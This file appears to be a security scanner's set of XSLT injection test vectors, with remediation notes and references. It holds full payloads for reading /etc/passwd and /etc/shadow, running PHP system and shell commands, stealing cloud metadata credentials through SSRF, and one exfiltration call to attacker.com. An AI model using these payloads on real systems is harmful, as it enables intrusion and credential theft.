"""
XSLT Injection Test Vectors
Targets XSLT transformation engines for file read, RCE, and data exfiltration
"""

from ..models import (
    TestVector, VulnerabilityType, TestVectorPosition as Position, PositionType,
    TestVectorPayload as PayloadTemplate, TestVectorEvidence as Evidence, ConfidenceLevel, SensitivityLevel
)

XSLT_INJECTION_VECTORS = [
    TestVector(
        id="xslt-file-read-001",
        name="XSLT File Read via document() Function",
        description="Read arbitrary files using XSLT document() function",
        vuln_type=VulnerabilityType.XSLT_INJECTION,
        position=Position(type=PositionType.BODY_XML, name="stylesheet", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document(\'file:///etc/passwd\')"/></xsl:template></xsl:stylesheet>',
            variants=[
                '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document(\'file:///etc/shadow\')"/></xsl:template></xsl:stylesheet>',
                '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document(\'file:///var/www/html/config.php\')"/></xsl:template></xsl:stylesheet>',
                '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="unparsed-text(\'file:///etc/passwd\')"/></xsl:template></xsl:stylesheet>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["File contents in response", "root:x:0:0", "<?php", "System file disclosure"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["xslt", "injection", "file-read", "information-disclosure", "xxe"],
        references=[
            "https://www.contextis.com/en/blog/xslt-server-side-injection-attacks",
            "https://owasp.org/www-community/vulnerabilities/XSLT_Injection",
            "https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-languaje-transformations"
        ],
        remediation="Disable document() function, validate XSLT templates, use secure XSLT processor configuration"
    ),
    
    TestVector(
        id="xslt-rce-php-001",
        name="XSLT RCE via PHP Extension Functions",
        description="Execute arbitrary PHP code through XSLT PHP extension functions",
        vuln_type=VulnerabilityType.XSLT_INJECTION,
        position=Position(type=PositionType.BODY_XML, name="xslt", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function(\'system\',\'id\')"/></xsl:template></xsl:stylesheet>',
            variants=[
                '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function(\'shell_exec\',\'whoami\')"/></xsl:template></xsl:stylesheet>',
                '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function(\'file_get_contents\',\'/etc/passwd\')"/></xsl:template></xsl:stylesheet>',
                '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function(\'passthru\',\'cat /etc/passwd\')"/></xsl:template></xsl:stylesheet>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Command output in response", "uid=", "www-data", "System command execution"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["xslt", "injection", "rce", "php", "command-execution"],
        references=[
            "https://www.sans.org/blog/anatomy-of-an-xslt-injection-vulnerability/",
            "https://www.php.net/manual/en/xsltprocessor.registerphpfunctions.php",
            "https://vulncat.fortify.com/en/detail?id=desc.structural.php.xslt_injection"
        ],
        remediation="Disable PHP functions in XSLT, use XSLTProcessor::registerPHPFunctions(null), validate templates"
    ),
    
    TestVector(
        id="xslt-ssrf-001",
        name="XSLT SSRF via External Resources",
        description="Perform SSRF attacks using XSLT external resource loading",
        vuln_type=VulnerabilityType.XSLT_INJECTION,
        position=Position(type=PositionType.BODY_XML, name="transform", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document(\'http://169.254.169.254/latest/meta-data/iam/security-credentials/\')"/></xsl:template></xsl:stylesheet>',
            variants=[
                '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document(\'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\')"/></xsl:template></xsl:stylesheet>',
                '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document(\'http://localhost:8080/admin\')"/></xsl:template></xsl:stylesheet>',
                '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document(\'http://attacker.com/exfiltrate?data=\' || system-property(\'xsl:vendor\'))"/></xsl:template></xsl:stylesheet>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Internal resource accessed", "Cloud metadata", "Internal service response", "SSRF successful"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["xslt", "injection", "ssrf", "cloud-metadata", "internal-access"],
        references=[
            "https://portswigger.net/web-security/xxe/xslt-injection",
            "https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/",
            "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection"
        ],
        remediation="Disable external entity resolution, restrict document() access, use secure resolver configuration"
    )
]
